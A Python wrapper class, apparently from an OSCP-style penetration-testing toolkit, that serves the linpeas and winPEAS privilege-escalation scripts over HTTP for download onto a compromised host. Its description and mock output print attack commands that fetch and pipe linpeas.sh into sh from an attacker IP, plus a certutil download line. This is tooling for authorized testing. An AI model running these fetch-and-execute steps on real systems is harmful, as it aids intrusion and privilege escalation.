"""linpeas/winPEAS wrapper — serves the PEAS privilege-escalation scripts
over HTTP for pulling onto a foothold shell, rather than scanning anything."""
from __future__ import annotations

from pathlib import Path

from .base import BaseTool, resolve_binary

_PEAS_DIR = Path("/opt/peas")
_PEAS_PORT = "8022"


class LinpeasTool(BaseTool):
    name   = "linpeas"
    binary = "python3"
    description = (
        "Serve linpeas.sh/winPEASx64.exe locally so you can pull them onto "
        "a foothold shell and run the standard OSCP privilege-escalation "
        "enumeration script there — unlike every other tool wrapped here, "
        "this doesn't scan or touch the network *target* at all (the "
        "*target* field is ignored); it starts a plain HTTP server on "
        "this machine for a limited window, and the enumeration output "
        "itself only ever appears in your foothold shell's own terminal, "
        "not here. From that shell: "
        "`curl http://<your-attacker-ip>:8022/linpeas.sh | sh` (Linux) or "
        "`certutil -urlcache -f http://<your-attacker-ip>:8022/"
        "winPEASx64.exe winpeas.exe` (Windows). Click Stop once you've "
        "pulled the file — the server keeps running until then or the "
        "timeout hits."
    )
    example = f"python3 -m http.server {_PEAS_PORT} --directory /opt/peas"
    install_hints = {
        "docker": "Only bundled in the Docker image (see Dockerfile) — "
                  "download linpeas.sh/winPEASx64.exe yourself "
                  "(https://github.com/carlospolop/PEASS-ng/releases) and "
                  "serve them from any local directory with "
                  "`python3 -m http.server` for the same effect.",
    }
    # Generous window: this is a download server, not a scan — give the
    # tester real time to actually trigger the download from a foothold
    # shell (which may itself be on a slow reverse-shell link) rather than
    # timing out mid-transfer the way a normal scan's budget would.
    timeout_seconds = 300

    def is_available(self) -> bool:
        # BaseTool's default only checks the *binary* (python3, which is
        # always present — this whole app is Python) — that alone would
        # report "available" even with linpeas.sh never actually
        # installed to serve, hiding a real 404 behind what looks like a
        # normal run. Confirm the bundled script is actually there too.
        return resolve_binary(self.binary) is not None and (_PEAS_DIR / "linpeas.sh").is_file()

    def build_command(self, fast: bool = False) -> list[str]:
        return ["python3", "-m", "http.server", _PEAS_PORT, "--directory", str(_PEAS_DIR)]

    def mock_output(self) -> str:
        return f"""\
Serving HTTP on 0.0.0.0 port {_PEAS_PORT} (http://0.0.0.0:{_PEAS_PORT}/) ...

⚠  This target ('{self.target}') is ignored by this tool — it serves
   linpeas.sh/winPEASx64.exe locally, it doesn't scan the network target.
   Pull the script from your own foothold shell once this is running for
   real:
     curl http://<your-attacker-ip>:{_PEAS_PORT}/linpeas.sh | sh
     certutil -urlcache -f http://<your-attacker-ip>:{_PEAS_PORT}/winPEASx64.exe winpeas.exe

[SIMULATED — linpeas.sh not bundled on this machine; only available in the Docker image]"""
